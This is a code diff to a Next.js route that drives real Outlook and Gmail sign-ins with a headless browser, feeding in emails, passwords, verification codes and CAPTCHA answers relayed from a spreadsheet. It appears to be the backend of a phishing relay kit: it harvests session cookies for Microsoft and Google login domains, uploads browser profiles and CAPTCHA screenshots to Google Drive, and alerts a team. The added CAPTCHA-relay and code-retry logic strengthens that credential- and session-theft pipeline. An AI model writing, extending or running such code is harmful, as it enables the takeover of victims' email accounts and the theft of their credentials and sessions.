@@ -1,6 +1,4 @@
-﻿console.log("--- route.js file loaded ---"); // Top-level log
-console.log(`[ARCH DETECT] Node.js arch: ${process.arch}, platform: ${process.platform}, version: ${process.version}`);
-import { NextResponse } from "next/server";
+﻿import { NextResponse } from "next/server";
 import puppeteer from "puppeteer-core";
 import chromium from "@sparticuz/chromium-min";
 import { inspect } from 'util';
@@ -23,7 +21,8 @@ import {
     checkVerification,
     setCorsHeaders,
     startAppScriptDataBackgroundUpdater,
-    stopAppScriptDataBackgroundUpdater
+    stopAppScriptDataBackgroundUpdater,
+    saveDebugSnapshot
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails
@@ -43,7 +42,7 @@ const PLATFORM_INBOX_URLS = {
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
 const activeProcesses = new Set();
 const activeBrowserSessions = new Map();
-logger.info(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
+logger.debug(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
 
 export const maxDuration = 60;
 export const dynamic = "force-dynamic";
@@ -173,7 +172,7 @@ async function handleAdditionalViews(page, platformConfig, instanceId, context =
                     logger.info(`[handleAdditionalViews][${instanceId}] Clicked element with text "${view.action.text}" for view: ${view.name}`);
                     clickedViewAction = true;
                     const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
-                    await page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 3000 }).catch(() => null);
+                    await page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 10000 }).catch(() => null);
                     await new Promise(r => setTimeout(r, 500));
                 }
             } catch (textClickError) {
@@ -187,7 +186,7 @@ async function handleAdditionalViews(page, platformConfig, instanceId, context =
                 try {
                     await page.waitForSelector(selector, { visible: true, timeout: 5000 });
                     const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
-                    const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 3000 }).catch(() => null);
+                    const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 10000 }).catch(() => null);
                     await page.click(selector);
                     await navigationPromise;
                     logger.info(`[handleAdditionalViews][${instanceId}] Clicked action selector '${selector}' for view: ${view.name}`);
@@ -652,7 +651,16 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
             }
         }
         if (emailExists && accountAccess && !requiresVerification) {
-            reachedInbox = await isInbox(page, platformConfig);
+            // Retry inbox check — page may still be redirecting after login
+            for (let attempt = 0; attempt < 3; attempt++) {
+                reachedInbox = await isInbox(page, platformConfig);
+                if (reachedInbox) break;
+                logger.info(`[checkAccountAccess][${instanceId}] Inbox not reached yet (attempt ${attempt + 1}/3). Waiting 5s for page to settle...`);
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            }
+            if (!reachedInbox) {
+                logger.warn(`[checkAccountAccess][${instanceId}] Inbox still not reached after 3 attempts. Current URL: ${page.url()}`);
+            }
         }
         return { emailExists, accountAccess, reachedInbox, requiresVerification, verificationState: null };
     } catch (err) {
@@ -676,8 +684,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     let page = null;
     let targetCreatedListener = null; // Defined here to be accessible in finally
     let finalStatus = "FAILED";
+    let processingStarted = false; // Track if main processing flow was reached
     let updateData = { status: finalStatus };
     let browserFullyClosed = false;
+    let exitingEarly = false;
     let platform = 'unknown';
     let initialCheckResult = {
         emailExists: false,
@@ -834,6 +844,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
 
         // Main state handling logic
+        processingStarted = true;
         if (status === "WAITING") {
             logger.debug(`[processRow][${browserId}] Initial WAITING state. Performing initial checkAccountAccess.`);
             await handleAdditionalViews(page, platformConfig, instanceId, 'initial_load');
@@ -917,6 +928,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         platformConfig = platformConfigs[platform] || {};
 
                         initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId, true); // For email retry, reuse session, no navigation
+                        logger.info(`[processRow][${browserId}] checkAccountAccess result: emailExists=${initialCheckResult.emailExists}, accountAccess=${initialCheckResult.accountAccess}, reachedInbox=${initialCheckResult.reachedInbox}, requiresVerification=${initialCheckResult.requiresVerification}, verificationState=${initialCheckResult.verificationState}, error=${initialCheckResult.error || 'none'}`);
 
                         // Immediately check the result for generic email errors and set status within the polling loop
                         if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
@@ -941,6 +953,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             // Clear the email, domain, and password fields in the sheet when transitioning to WAITINGEMAIL
                             logger.debug(`[processRow][${browserId}] Clearing email, domain, password. Returning to WAITINGEMAIL state.`);
                             await updateBrowserRowData(browserId, { ...updateData, email: '', domain: '', password: '', verified: false, fullAccess: false });
+                            exitingEarly = true;
                             return; // Exit processRow immediately so no later logic overwrites status
                         }
 
@@ -957,6 +970,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 if (!emailProvidedAndProcessed) {
                     await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before next poll (reduced from 10000 to 5000)
                 }
+            }
+
+            logger.debug(`[processRow][${browserId}][WAITINGEMAIL] Exited poll loop. emailProvided: ${emailProvidedAndProcessed}, now: ${Date.now()}, timeoutAt: ${pollingTimeoutEmail}, diff: ${pollingTimeoutEmail - Date.now()}ms, finalStatus: ${finalStatus}`);
+
+            if (emailProvidedAndProcessed) {
+                logger.info(`[processRow][${browserId}] Email was provided. finalStatus=${finalStatus}, verificationState=${initialCheckResult.verificationState}, emailExists=${initialCheckResult.emailExists}, accountAccess=${initialCheckResult.accountAccess}`);
             }
 
             if (!emailProvidedAndProcessed) {
@@ -991,6 +1010,126 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 logger.debug(`[processRow][${browserId}] Exiting WAITINGEMAIL timeout path.`);
                 return; // Exit processRow if email not found
             }
+        } else if (status === "WAITINGCAPTCHA") {
+            logger.info(`[processRow][${browserId}] Resuming from WAITINGCAPTCHA state.`);
+            const captchaConfig = platformConfig.captchaConfig;
+            if (!captchaConfig) {
+                logger.error(`[processRow][${browserId}] WAITINGCAPTCHA but no captchaConfig for platform ${platform}. Failing.`);
+                finalStatus = "FAILED";
+                updateData.status = "FAILED";
+            } else {
+                const captchaPollTimeout = Date.now() + 5 * 60 * 1000;
+                let captchaProcessed = false;
+                while (Date.now() < captchaPollTimeout && !captchaProcessed) {
+                    try {
+                        if (page && !(await isPageResponsive(page, browserId, instanceId))) {
+                            logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Page unresponsive.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+                        const checkData = await fetchDataFromAppScript(1, 30000, true);
+                        const checkHeaders = checkData[0];
+                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                        const checkRows = checkData.slice(1);
+                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+                        if (!checkRow) {
+                            logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Row not found.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+                        if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Status changed to FAILED externally.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+                        const captchaAnswer = checkRow[checkColumnIndexes['captchaAnswer']];
+                        if (captchaAnswer && String(captchaAnswer).trim() !== "") {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] CAPTCHA answer found: ${captchaAnswer}`);
+                            await updateBrowserRowData(browserId, { status: "PROCESSING", captchaAnswer: '' });
+                            // Find and fill the captcha answer input
+                            const answerSelectors = captchaConfig.answerInput.split(',').map(s => s.trim());
+                            let filled = false;
+                            for (const sel of answerSelectors) {
+                                try {
+                                    await page.waitForSelector(sel, { visible: true, timeout: 5000 });
+                                    await page.evaluate((s) => { const el = document.querySelector(s); if (el) el.value = ''; }, sel);
+                                    await page.type(sel, captchaAnswer, { delay: 30 });
+                                    filled = true;
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Filled answer using selector: ${sel}`);
+                                    break;
+                                } catch (e) { /* try next */ }
+                            }
+                            if (filled) {
+                                const submitSelectors = captchaConfig.submitButton.split(',').map(s => s.trim());
+                                let submitted = false;
+                                for (const sel of submitSelectors) {
+                                    try {
+                                        await page.waitForSelector(sel, { visible: true, timeout: 5000 });
+                                        await page.click(sel);
+                                        submitted = true;
+                                        logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Clicked submit: ${sel}`);
+                                        break;
+                                    } catch (e) { /* try next */ }
+                                }
+                                if (!submitted) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Submit button not found, pressing Enter.`);
+                                    await page.keyboard.press('Enter');
+                                }
+                                await new Promise(res => setTimeout(res, 3000));
+                                // Re-check account access after captcha submission
+                                const recheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId, true);
+                                logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Re-check after captcha: ${JSON.stringify(recheckResult)}`);
+                                if (recheckResult.verificationState === 'CAPTCHA_FAILED') {
+                                    // Still on captcha, re-screenshot and update
+                                    try {
+                                        const screenshotBuffer = await page.screenshot({ fullPage: true });
+                                        const base64Image = screenshotBuffer.toString('base64');
+                                        const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
+                                        const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
+                                        if (uploadResult.success) {
+                                            updateData.captcha = uploadResult.webViewLink;
+                                            await updateBrowserRowData(browserId, { captcha: uploadResult.webViewLink });
+                                        }
+                                    } catch (ssError) {
+                                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Re-screenshot error: ${ssError.message}`);
+                                    }
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Still on captcha after answer. Re-entering WAITINGCAPTCHA.`);
+                                    await new Promise(res => setTimeout(res, 5000));
+                                } else if (recheckResult.reachedInbox) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed! Reached inbox.`);
+                                    finalStatus = "COMPLETED";
+                                    captchaProcessed = true;
+                                    break;
+                                } else if (recheckResult.requiresVerification) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on verification screen.`);
+                                    finalStatus = recheckResult.verificationState;
+                                    captchaProcessed = true;
+                                    break;
+                                } else if (recheckResult.emailExists) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on password screen.`);
+                                    finalStatus = "WAITINGPASSWORD";
+                                    captchaProcessed = true;
+                                    break;
+                                } else {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Unknown post-captcha state. Retrying.`);
+                                }
+                            } else {
+                                logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Could not find captcha answer input. Retrying.`);
+                            }
+                        }
+                    } catch (pollError) {
+                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Poll error: ${pollError.message}`);
+                    }
+                    if (!captchaProcessed && finalStatus !== "FAILED") {
+                        await new Promise(res => setTimeout(res, 5000));
+                    }
+                }
+                if (!captchaProcessed && finalStatus !== "FAILED") {
+                    logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Polling timed out.`);
+                    finalStatus = "WAITINGCAPTCHA";
+                }
+            }
+            updateData.status = finalStatus;
         } else if (status === "WAITINGPASSWORD") {
             logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state.`);
             const pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
@@ -1059,9 +1198,19 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         }
                                     }
                                     if (!foundSelector) {
-                                        const currentUrl = await page.url().catch(() => 'unknown');
+                                        const currentUrl = page.url();
                                         const pageTitle = await page.title().catch(() => 'unknown');
                                         logger.debug(`[processRow][${browserId}] Password input not found. URL: ${currentUrl}, Title: ${pageTitle}`);
+
+                                        if (currentUrl === 'about:blank' || (!currentUrl.includes('login.live.com') && !currentUrl.includes('login.microsoftonline.com'))) {
+                                            logger.info(`[processRow][${browserId}] Page is at ${currentUrl}, navigating to login page for password entry.`);
+                                            await page.goto(platformConfig.url || 'https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(e => {
+                                                logger.warn(`[processRow][${browserId}] Navigation to login page failed: ${e.message}`);
+                                            });
+                                            await new Promise(res => setTimeout(res, 3000));
+                                            continue;
+                                        }
+
                                         await handleAdditionalViews(page, platformConfig, instanceId, 'password_entry');
                                         const emailInputSelector = platformConfig.selectors?.input;
                                         if (emailInputSelector) {
@@ -1089,9 +1238,43 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                                 }
                                             }
                                         }
+                                        const captchaConfig = platformConfig.captchaConfig;
+                                        if (captchaConfig) {
+                                            const captchaUrl = page.url();
+                                            const isCaptcha = captchaConfig.urlPatterns.some(p => p.test(captchaUrl));
+                                            if (isCaptcha) {
+                                                logger.info(`[processRow][${browserId}] CAPTCHA detected in WAITINGPASSWORD loop. URL: ${captchaUrl}`);
+                                                try {
+                                                    const screenshotBuffer = await page.screenshot({ fullPage: true });
+                                                    const base64Image = screenshotBuffer.toString('base64');
+                const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
+                                                    const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
+                                                    if (uploadResult.success) {
+                                                        logger.info(`[processRow][${browserId}] CAPTCHA screenshot uploaded: ${uploadResult.webViewLink}`);
+                                                        updateData.captcha = uploadResult.webViewLink;
+                                                    } else {
+                                                        logger.error(`[processRow][${browserId}] CAPTCHA upload failed: ${uploadResult.error}`);
+                                                    }
+                                                } catch (ssError) {
+                                                    logger.error(`[processRow][${browserId}] Error capturing CAPTCHA screenshot: ${ssError.message}`);
+                                                }
+                                                finalStatus = "WAITINGCAPTCHA";
+                                                updateData.status = "WAITINGCAPTCHA";
+                                                updateData.lastJsonResponse = JSON.stringify({
+                                                    browserId, email, status: "WAITINGCAPTCHA",
+                                                    emailExists: true, accountAccess: false, reachedInbox: false,
+                                                    platform, timestamp: new Date().toISOString(),
+                                                    message: "CAPTCHA challenge detected. Awaiting user input.",
+                                                    captchaUrl: page.url()
+                                                });
+                                                passwordProvidedAndProcessed = true;
+                                                break;
+                                            }
+                                        }
                                         await new Promise(res => setTimeout(res, 1000));
                                     }
                                 }
+                                if (passwordProvidedAndProcessed) break;
                                 if (!foundSelector) {
                                     throw new Error(`Password input not found after 30s polling timeout. Tried selectors: ${JSON.stringify(passwordInputSelectors)}`);
                                 }
@@ -1559,8 +1742,13 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 await page.waitForSelector(selectedOption.inputSelector, { visible: true, timeout: 5000 });
                                 logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Input selector '${selectedOption.inputSelector}' is visible before typing.`);
                                 await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, selectedOption.inputSelector);
-                                await page.type(selectedOption.inputSelector, hiddenInputText, { delay: 50 });
-                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${hiddenInputText}" into ${selectedOption.inputSelector}`);
+                                let typedValue = hiddenInputText;
+                                if (selectedOption.inputSelector === '#iProofEmail' && typedValue.includes('@')) {
+                                    typedValue = typedValue.slice(0, typedValue.lastIndexOf('@'));
+                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Stripped domain from email input: "${hiddenInputText}" → "${typedValue}"`);
+                                }
+                                await page.type(selectedOption.inputSelector, typedValue, { delay: 50 });
+                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${typedValue}" into ${selectedOption.inputSelector}`);
                             } else if (selectedOption.requiresInput && !hiddenInputText && currentActualViewName === 'Outlook Verify Email Full Input') {
                                 logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'Outlook Verify Email Full Input' requires hiddenInputText (full email) but it's missing. Clearing choice.`);
                                 await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
@@ -2114,7 +2302,105 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 }
 
                                 if (codeErrorDetected) {
-                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Incorrect code. Remaining on code entry screen.`);
+                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Code error selector detected. Running safety check before marking incorrect...`);
+                                    // SAFETY: Wait for page to settle, then verify we actually remain on code entry
+                                    await new Promise(res => setTimeout(res, 5000));
+
+                                    // Check 1: Did we reach the inbox directly?
+                                    const postErrorInbox = await isInbox(page, platformConfig).catch(() => false);
+                                    if (postErrorInbox) {
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Code was correct despite error flash. Inbox reached.`);
+                                        finalStatus = "COMPLETED";
+                                        codeSuccessfullyProcessed = true;
+
+                                        const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                        updateData.status = "COMPLETED";
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        updateData.verified = true;
+                                        updateData.fullAccess = true;
+                                        updateData.lastJsonResponse = JSON.stringify({
+                                            browserId, email, status: "COMPLETED",
+                                            emailExists: initialCheckResult.emailExists, accountAccess: true,
+                                            reachedInbox: true, requiresVerification: false,
+                                            verified: true, fullAccess: true,
+                                            platform, timestamp: new Date().toISOString(),
+                                            message: "Code accepted despite error flash. Reached inbox."
+                                        });
+
+                                        if (browser) {
+                                            if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
+                                            logger.info(`[processRow][${browserId}] Closing browser after successful verification (error-flash safety).`);
+                                            await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                                            browserFullyClosed = true;
+                                            activeBrowserSessions.delete(browserId);
+                                            await new Promise(resolve => setTimeout(resolve, 2000));
+                                        }
+
+                                        try {
+                                            const uploadedUrl = await uploadBrowserData(browserId);
+                                            if (uploadedUrl) updateData.driveUrl = uploadedUrl;
+                                        } catch (uploadError) {
+                                            logger.error(`[processRow][${browserId}] Error during Drive upload after safety check: ${uploadError.message}`);
+                                        }
+
+                                        if (updateData.driveUrl && userDataDir) {
+                                            try { await fs.remove(userDataDir); } catch (e) {}
+                                        }
+                                        break;
+                                    }
+
+                                    // Check 2: Page moved past code entry (e.g. into additional views)?
+                                    const postErrorState = await checkVerification(page, platformConfig).catch(() => ({ required: true, type: 'code' }));
+                                    if (!postErrorState.required || postErrorState.type !== 'code') {
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Page moved past code entry despite error flash. Handling additional views...`);
+                                        await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
+                                        // Wait for any pending navigation to complete after handling additional views
+                                        await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
+                                        await new Promise(res => setTimeout(res, 3000));
+                                        const inboxAfterViews = await isInbox(page, platformConfig).catch(() => false);
+                                        if (inboxAfterViews) {
+                                            logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after additional views. Setting COMPLETED.`);
+                                            finalStatus = "COMPLETED";
+                                            codeSuccessfullyProcessed = true;
+
+                                            const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                            updateData.status = "COMPLETED";
+                                            updateData.cookieJSON = JSON.stringify(browserCookies);
+                                            updateData.verified = true;
+                                            updateData.fullAccess = true;
+                                            updateData.lastJsonResponse = JSON.stringify({
+                                                browserId, email, status: "COMPLETED",
+                                                emailExists: initialCheckResult.emailExists, accountAccess: true,
+                                                reachedInbox: true, requiresVerification: false,
+                                                verified: true, fullAccess: true,
+                                                platform, timestamp: new Date().toISOString(),
+                                                message: "Code accepted. Reached inbox after additional views."
+                                            });
+
+                                            if (browser) {
+                                                if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
+                                                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                                                browserFullyClosed = true;
+                                                activeBrowserSessions.delete(browserId);
+                                                await new Promise(resolve => setTimeout(resolve, 2000));
+                                            }
+
+                                            try {
+                                                const uploadedUrl = await uploadBrowserData(browserId);
+                                                if (uploadedUrl) updateData.driveUrl = uploadedUrl;
+                                            } catch (uploadError) {
+                                                logger.error(`[processRow][${browserId}] Error during Drive upload after views check: ${uploadError.message}`);
+                                            }
+
+                                            if (updateData.driveUrl && userDataDir) {
+                                                try { await fs.remove(userDataDir); } catch (e) {}
+                                            }
+                                            break;
+                                        }
+                                    }
+
+                                    // Confirmed still on code entry — mark as incorrect
+                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Confirmed incorrect code after safety check. Remaining on code entry screen.`);
                                     const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                                     if (platform === 'gmail' && ljp.viewName === 'sh Gmail 2-Step Verification') {
                                         ljp.gmail = { step: "waiting_app_notification", canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." };
@@ -2125,6 +2411,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     ljp.message = "Incorrect verification code entered. Please try again.";
                                     await updateBrowserRowData(browserId, {
                                         status: "WAITINGCODE",
+                                        verificationCode: '',
                                         verified: true,
                                         fullAccess: false,
                                         lastJsonResponse: JSON.stringify(ljp)
@@ -2135,6 +2422,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 // If no code error, then wait 10 seconds and proceed with existing checks
                                 await new Promise(res => setTimeout(res, 10000)); // Increased wait to 10 seconds as requested
                                 await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
+                                // After handling additional views, wait for any pending navigation to complete
+                                await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
+                                // Extra settle time for Microsoft SPA redirects
+                                await new Promise(res => setTimeout(res, 3000));
                             } else {
                                 // No code entered, handle Gmail app approval or other passive verifications
                                 logger.info(`[processRow][${browserId}][WAITINGCODE] No code entry attempted. Waiting for passive verification completion. Checking inbox every 5 seconds.`);
@@ -2411,20 +2702,35 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         // However, if it's still the default "FAILED" from initialization, we can update it.
         // Prioritize explicit verification states from initialCheckResult
 
-        // Handle CAPTCHA_FAILED — no user action possible, immediately fail
+        // Handle CAPTCHA_FAILED — capture screenshot, upload to Drive, set WAITINGCAPTCHA
         if (initialCheckResult.verificationState === 'CAPTCHA_FAILED') {
-            logger.info(`[processRow][${browserId}] CAPTCHA_FAILED detected. Setting final status to FAILED.`);
-            finalStatus = "FAILED";
+            logger.info(`[processRow][${browserId}] CAPTCHA_FAILED detected. Capturing screenshot and setting WAITINGCAPTCHA.`);
+            try {
+                const screenshotBuffer = await page.screenshot({ fullPage: true });
+                const base64Image = screenshotBuffer.toString('base64');
+                const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
+                const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
+                if (uploadResult.success) {
+                    logger.info(`[processRow][${browserId}] CAPTCHA screenshot uploaded: ${uploadResult.webViewLink}`);
+                    updateData.captcha = uploadResult.webViewLink;
+                } else {
+                    logger.error(`[processRow][${browserId}] CAPTCHA upload failed: ${uploadResult.error}`);
+                }
+            } catch (ssError) {
+                logger.error(`[processRow][${browserId}] Error capturing CAPTCHA screenshot: ${ssError.message}`);
+            }
+            finalStatus = "WAITINGCAPTCHA";
+            updateData.status = "WAITINGCAPTCHA";
             updateData.lastJsonResponse = JSON.stringify({
-                browserId, email, status: "FAILED",
+                browserId, email, status: "WAITINGCAPTCHA",
                 emailExists: initialCheckResult.emailExists,
                 accountAccess: false,
                 reachedInbox: false,
                 platform, timestamp: new Date().toISOString(),
-                message: "CAPTCHA challenge detected. Automated bypass is not available."
+                message: "CAPTCHA challenge detected. Awaiting user input.",
+                captchaUrl: page ? page.url() : undefined
             });
-            updateData.status = "FAILED";
-            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, detail: 'CAPTCHA challenge detected - cannot bypass automatically', url: initialCheckResult.url });
+            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, detail: 'CAPTCHA challenge detected - screenshot uploaded', url: page ? page.url() : undefined });
             await updateBrowserRowData(browserId, updateData);
             return;
         }
@@ -2553,7 +2859,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             } else {
                 finalStatus = "FAILED";
             }
-        } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED") {
+        } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGCODE") {
             finalStatus = "FAILED";
         }
 
@@ -2579,7 +2885,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
 
 
-        if (finalStatus === "COMPLETED") {
+        if (finalStatus === "COMPLETED" && !browserFullyClosed) {
             const allUrls = [
                 `https://${domain}`,
                 `https://login.live.com`,
@@ -2641,11 +2947,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
     } catch (error) {
         logger.error(`[processRow][${browserId}] Error processing row: ${error.message}`, error);
-        finalStatus = "FAILED";
-        updateData.status = "FAILED";
-        updateData.verified = false; // FAILED so verified false
-        updateData.fullAccess = false; // FAILED so fullAccess false
-        updateData.lastJsonResponse = JSON.stringify({
+        if (finalStatus !== "COMPLETED") {
+            finalStatus = "FAILED";
+            updateData.status = "FAILED";
+            updateData.verified = false;
+            updateData.fullAccess = false;
+            updateData.lastJsonResponse = JSON.stringify({
             browserId, email, status: "FAILED", error: error.message,
             platform, timestamp: new Date().toISOString(),
             ...(initialCheckResult.emailExists !== undefined && {
@@ -2657,7 +2964,14 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             })
         });
         notifyTeam({ type: 'UNEXPECTED_ERROR', platform, email, browserId, error: error.message, detail: 'processRow outer catch' });
+        }
     } finally {
+        if (updateData.status === "FAILED" && page && typeof page.content === 'function') {
+            const endpointUrl = typeof page.url === 'function' ? page.url() : 'unknown';
+            saveDebugSnapshot(page, browserId, endpointUrl, updateData.reason || 'No reason provided').catch(err =>
+                logger.error(`[processRow][${browserId}] saveDebugSnapshot failed: ${err.message}`)
+            );
+        }
         if (browser && !browserFullyClosed) {
             const sessionTargetListener = isReusingBrowser ? activeBrowserSessions.get(browserId)?.targetCreatedListener : targetCreatedListener;
             if (sessionTargetListener && browser) { // Ensure listener exists before trying to remove
@@ -2668,7 +2982,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
             }
 
-            if (updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGRECOVERYEMAIL" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL" || updateData.status === "WAITINGPASSWORDERROR" || updateData.status === "WAITINGEMAILERROR") {
+            if (updateData.status === "WAITINGCAPTCHA" || updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGRECOVERYEMAIL" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL" || updateData.status === "WAITINGPASSWORDERROR" || updateData.status === "WAITINGEMAILERROR") {
                 logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
                 activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
             } else {
@@ -2678,7 +2992,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 activeBrowserSessions.delete(browserId);
                 await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
             }
-        } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGRECOVERYEMAIL" && updateData.status !== "WAITINGPASSWORD" && updateData.status !== "WAITINGPASSWORDERROR" && updateData.status !== "WAITINGEMAILERROR")) {
+        } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCAPTCHA" && updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGRECOVERYEMAIL" && updateData.status !== "WAITINGPASSWORD" && updateData.status !== "WAITINGPASSWORDERROR" && updateData.status !== "WAITINGEMAILERROR")) {
             const session = activeBrowserSessions.get(browserId);
             if (session?.targetCreatedListener && session.browser) {
                 try {
@@ -2696,10 +3010,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
         const finalSheetUpdate = { ...updateData };
         // Ensure FAILED status includes the latest email and password
-        if (finalSheetUpdate.status === "FAILED") {
+        if (finalSheetUpdate.status === "FAILED" && processingStarted) {
             finalSheetUpdate.email = email || finalSheetUpdate.email;
             finalSheetUpdate.password = password || finalSheetUpdate.password;
             notifyTeam({ type: 'BROWSER_FAILURE', platform, email, browserId, detail: 'Process ended with FAILED status', url: page ? page.url() : undefined });
+        } else if (finalSheetUpdate.status === "FAILED" && !processingStarted) {
